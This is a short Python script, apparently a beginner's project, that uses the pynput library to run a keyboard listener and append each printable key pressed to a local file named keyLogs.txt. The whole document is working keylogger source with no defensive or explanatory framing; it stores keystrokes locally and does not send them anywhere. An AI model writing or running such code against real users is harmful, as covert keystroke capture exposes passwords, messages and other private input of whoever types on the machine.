# Imported Libraries: 
from pynput import keyboard 

# Key logging Function:
def keyPressed(key):
    with open("keyLogs.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
            logKey.write("\n")
        except:
            print("")

if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

logFile = "keyLogs.txt"


